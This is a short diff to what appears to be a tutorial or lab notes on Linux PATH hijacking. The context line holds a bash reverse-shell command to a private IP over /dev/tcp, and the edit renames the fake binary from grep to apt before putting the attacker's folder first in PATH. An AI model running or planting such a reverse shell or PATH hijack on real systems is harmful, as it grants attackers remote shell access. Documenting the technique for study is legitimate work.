@@ -173,7 +173,7 @@ exec 196<>/dev/tcp/192.168.1.44/4443; sh <&196 >&196 2>&196 &
 
 make executable 
 ```
-chmod 755 grep
+chmod 755 apt
 ```
 change PATH so it check your folder first when the program is run
 ```
